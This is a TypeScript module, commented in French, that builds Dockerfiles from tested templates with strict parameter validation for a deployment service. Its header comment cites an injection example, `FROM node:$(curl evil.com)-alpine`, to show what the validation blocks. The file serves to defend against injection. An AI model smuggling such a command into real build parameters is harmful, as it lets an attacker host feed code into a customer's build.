import type { OutputMode, RuntimeFamily } from "./project-analyze.js"

/**
 * Cinq gabarits de `Dockerfile`, écrits et éprouvés une fois pour toutes les exécutions.
 *
 * L'IA ne rédige jamais le texte : elle choisit un gabarit (`pickTemplate`) et en fixe
 * les paramètres (`DockerfileParams`), déduits du constat du jalon 2. Un `Dockerfile`
 * écrit à la volée serait différent à chaque exécution, jamais testé au préalable, et
 * ses échecs arriveraient au support de SkyNode plutôt qu'à un correctif du gabarit.
 *
 * Chaque paramètre passe son propre motif avant de rejoindre la moindre chaîne composée :
 * `version` et `repertoire` proviennent d'une déduction sur le dépôt d'un client, donc
 * indirectement d'un texte que l'agent a lu. Un `FROM node:$(curl evil.com)-alpine` doit
 * rester impossible, pas seulement improbable.
 */

export interface DockerfileParams {
  famille: "node" | "python" | "static"
  sortie: "server" | "standalone" | "static"
  version: string
  gestionnaire: "pnpm" | "npm" | "yarn" | "bun" | null
  port: number
  /** Le répertoire produit par la construction, pour les sorties statiques. */
  repertoire: string | null
}

/** Une version de runtime, et rien d'autre : ni option, ni commande, ni chemin. */
const VERSION_PATTERN = /^\d+(\.\d+){0,2}$/

/** Un chemin relatif simple, sous la racine du projet. */
const DIRECTORY_PATTERN = /^[A-Za-z0-9._-]+(\/[A-Za-z0-9._-]+)*$/

/** La plage applicative. En deçà, il faudrait des privilèges que le conteneur n'a pas. */
const PORT_MIN = 1
const PORT_MAX = 65535

/** La commande d'installation par gestionnaire, verrouillée sur le fichier de lock qu'il produit. */
const INSTALL: Record<"pnpm" | "npm" | "yarn" | "bun", string> = {
  pnpm: "corepack enable && pnpm install --frozen-lockfile",
  npm: "npm ci",
  yarn: "corepack enable && yarn install --frozen-lockfile",
  bun: "bun install --frozen-lockfile",
}

/**
 * Sans gestionnaire détecté, il n'y a pas de fichier de verrouillage à figer : `npm ci`
 * échouerait sur un dépôt par ailleurs valide. `npm install` est la seule commande qui
 * fonctionne dans ce cas, quel que soit l'écosystème d'origine.
 */
const FALLBACK_INSTALL = "npm install"

function installCommand(gestionnaire: DockerfileParams["gestionnaire"]): string {
  return gestionnaire === null ? FALLBACK_INSTALL : INSTALL[gestionnaire]
}

function copyCommand(gestionnaire: DockerfileParams["gestionnaire"]): string {
  // Chaque gestionnaire a son propre fichier de verrouillage ; le copier seul (plutôt que
  // tout le dépôt) est ce qui permet à Docker de mettre en cache l'étape d'installation
  // tant que les dépendances n'ont pas changé.
  switch (gestionnaire) {
    case "pnpm":
      return "COPY package.json pnpm-lock.yaml* ./"
    case "yarn":
      return "COPY package.json yarn.lock* ./"
    case "bun":
      return "COPY package.json bun.lock* bun.lockb* ./"
    case "npm":
      return "COPY package.json package-lock.json* ./"
    case null:
      return "COPY package.json ./"
  }
}

function validateVersion(version: string): void {
  if (!VERSION_PATTERN.test(version)) {
    throw new Error(`version invalide : « ${version} » n'est pas un numéro de version (ex. « 22 », « 3.12 »)`)
  }
}

function validateDirectory(repertoire: string): void {
  // Le motif seul laisse passer « ../etc » : les deux points appartiennent à la classe de
  // caractères autorisée, et rien n'empêche un segment de valoir exactement « .. ». On
  // rejette donc aussi tout segment de traversée, en plus des caractères interdits.
  const segments = repertoire.split("/")
  const traverses = segments.some((segment) => segment === "" || segment === "." || segment === "..")

  if (!DIRECTORY_PATTERN.test(repertoire) || traverses) {
    throw new Error(`répertoire de sortie invalide : « ${repertoire} » doit être un chemin relatif simple`)
  }
}

function validatePort(port: number): void {
  if (!Number.isInteger(port) || port < PORT_MIN || port > PORT_MAX) {
    throw new Error(`port invalide : ${port} doit être un entier entre ${PORT_MIN} et ${PORT_MAX}`)
  }
}

/** Toutes les validations avant qu'aucune chaîne ne soit composée avec ces valeurs. */
function validate(params: DockerfileParams): void {
  validateVersion(params.version)
  validatePort(params.port)
  if (params.repertoire !== null) validateDirectory(params.repertoire)
}

export function generateDockerfile(params: DockerfileParams): string {
  validate(params)

  switch (params.famille) {
    case "node":
      return params.sortie === "static" ? nodeStatic(params) : nodeServerOrStandalone(params)
    case "python":
      return pythonServer(params)
    case "static":
      return staticSite(params)
  }
}

/**
 * Node, sorties `server` et `standalone` : une étape de construction complète (avec les
 * `devDependencies`), une étape d'exécution allégée qui ne recopie que le nécessaire.
 * `standalone` (Next.js) ne recopie même pas `node_modules` : le dossier `.next/standalone`
 * embarque déjà ses dépendances.
 */
function nodeServerOrStandalone(params: DockerfileParams): string {
  const install = installCommand(params.gestionnaire)
  const copyLock = copyCommand(params.gestionnaire)

  if (params.sortie === "standalone") {
    return [
      `FROM node:${params.version}-alpine AS builder`,
      "WORKDIR /app",
      copyLock,
      `RUN ${install}`,
      "COPY . .",
      // `public/` n'est pas garanti : un dépôt minimal ou vibe-codé peut ne pas en avoir.
      // Le créer ici, avant la copie multi-étapes qui suit, évite un `COPY` en échec sur
      // un répertoire absent — la construction ne doit pas dépendre d'un dossier que
      // create-next-app scaffolde par convention, jamais par obligation.
      "RUN mkdir -p public",
      "RUN npm run build",
      "",
      `FROM node:${params.version}-alpine`,
      "WORKDIR /app",
      "RUN addgroup -S skynode && adduser -S skynode -G skynode",
      "COPY --from=builder /app/.next/standalone ./",
      "COPY --from=builder /app/.next/static ./.next/static",
      "COPY --from=builder /app/public ./public",
      "USER skynode",
      `EXPOSE ${params.port}`,
      'CMD ["node", "server.js"]',
      "",
    ].join("\n")
  }

  // `server` : l'application se lance via son propre script `start`, `node_modules`
  // (hors devDependencies) doit donc survivre jusqu'à l'exécution.
  return [
    `FROM node:${params.version}-alpine AS builder`,
    "WORKDIR /app",
    copyLock,
    `RUN ${install}`,
    "COPY . .",
    "RUN npm run build",
    "",
    `FROM node:${params.version}-alpine`,
    "WORKDIR /app",
    "ENV NODE_ENV=production",
    "RUN addgroup -S skynode && adduser -S skynode -G skynode",
    copyLock,
    `RUN ${gestionnaireProdInstall(params.gestionnaire)}`,
    "COPY --from=builder /app/dist ./dist",
    "USER skynode",
    `EXPOSE ${params.port}`,
    'CMD ["npm", "start"]',
    "",
  ].join("\n")
}

/** L'étape d'exécution n'a besoin que des dépendances de production, jamais des outils de build. */
function gestionnaireProdInstall(gestionnaire: DockerfileParams["gestionnaire"]): string {
  switch (gestionnaire) {
    case "pnpm":
      return "corepack enable && pnpm install --prod --frozen-lockfile"
    case "yarn":
      return "corepack enable && yarn install --production --frozen-lockfile"
    case "bun":
      return "bun install --production --frozen-lockfile"
    case "npm":
      return "npm ci --omit=dev"
    case null:
      return "npm install --omit=dev"
  }
}

/**
 * Node, sortie `static` : la construction produit un répertoire de fichiers (Vite, par
 * exemple) qu'un serveur web statique sert seul, sans runtime Node en production.
 */
function nodeStatic(params: DockerfileParams): string {
  const install = installCommand(params.gestionnaire)
  const copyLock = copyCommand(params.gestionnaire)
  const repertoire = params.repertoire ?? "dist"
  validateDirectory(repertoire)

  return [
    `FROM node:${params.version}-alpine AS builder`,
    "WORKDIR /app",
    copyLock,
    `RUN ${install}`,
    "COPY . .",
    "RUN npm run build",
    "",
    "FROM nginx:alpine",
    `COPY --from=builder /app/${repertoire} /usr/share/nginx/html`,
    "RUN addgroup -S skynode && adduser -S skynode -G skynode " +
      "&& chown -R skynode:skynode /usr/share/nginx/html " +
      "&& chown -R skynode:skynode /var/cache/nginx /run",
    "USER skynode",
    `EXPOSE ${params.port}`,
    'CMD ["nginx", "-g", "daemon off;"]',
    "",
  ].join("\n")
}

/**
 * Python, sortie `server` (ASGI) : une étape qui compile les dépendances éventuellement
 * natives, une étape d'exécution qui ne recopie que le paquet installé — jamais les
 * en-têtes ni le compilateur qui l'ont produit.
 */
function pythonServer(params: DockerfileParams): string {
  return [
    `FROM python:${params.version}-slim AS builder`,
    "WORKDIR /app",
    "COPY requirements.txt .",
    "RUN pip install --user --no-cache-dir -r requirements.txt",
    "COPY . .",
    "",
    `FROM python:${params.version}-slim`,
    "WORKDIR /app",
    "RUN useradd --system --create-home skynode",
    "COPY --from=builder /root/.local /home/skynode/.local",
    "COPY --from=builder /app .",
    "ENV PATH=/home/skynode/.local/bin:$PATH",
    "RUN chown -R skynode:skynode /app",
    "USER skynode",
    `EXPOSE ${params.port}`,
    `CMD ["uvicorn", "main:app", "--host", "0.0.0.0", "--port", "${params.port}"]`,
    "",
  ].join("\n")
}

/**
 * Statique pur (aucune construction Node ou Python) : le dépôt contient déjà les
 * fichiers à servir. La première étape n'existe que pour respecter l'invariant « au
 * moins deux `FROM` » et fixer les permissions avant de passer la main à `nginx`.
 */
function staticSite(params: DockerfileParams): string {
  const repertoire = params.repertoire ?? "."

  return [
    "FROM busybox AS prepare",
    "WORKDIR /site",
    `COPY ${repertoire} .`,
    "",
    "FROM nginx:alpine",
    "COPY --from=prepare /site /usr/share/nginx/html",
    "RUN addgroup -S skynode && adduser -S skynode -G skynode " +
      "&& chown -R skynode:skynode /usr/share/nginx/html " +
      "&& chown -R skynode:skynode /var/cache/nginx /run",
    "USER skynode",
    `EXPOSE ${params.port}`,
    'CMD ["nginx", "-g", "daemon off;"]',
    "",
  ].join("\n")
}

/**
 * Ce qui ne doit jamais entrer dans une image, quel que soit le gabarit choisi :
 * dépendances déjà réinstallées dans le conteneur, historique git, artefacts d'une
 * construction locale, et surtout tout fichier d'environnement — un `.env` copié dans une
 * couche d'image est lisible par quiconque obtient cette image, y compris longtemps après
 * qu'un secret a été changé côté client.
 */
export function generateDockerignore(): string {
  return [
    "node_modules",
    ".git",
    ".gitignore",
    ".env",
    ".env.*",
    "!.env.example",
    "Dockerfile",
    ".dockerignore",
    ".next",
    "dist",
    "build",
    "*.log",
    ".DS_Store",
    "",
  ].join("\n")
}

/**
 * Trois familles, trois sorties couvertes — les seules pour lesquelles un gabarit existe
 * et a été éprouvé. PHP, Go et tout ce qui reste `inconnu` n'ont pas d'équivalent : rendre
 * `null` ici fait renoncer le composeur plutôt que de lui faire improviser un gabarit
 * jamais testé (spec §5.4).
 */
export function pickTemplate(
  family: RuntimeFamily,
  output: OutputMode
): DockerfileParams["sortie"] | null {
  if (family === "node" && (output === "server" || output === "standalone" || output === "static")) {
    return output
  }
  if (family === "python" && output === "server") return "server"
  if (family === "static" && output === "static") return "static"
  return null
}
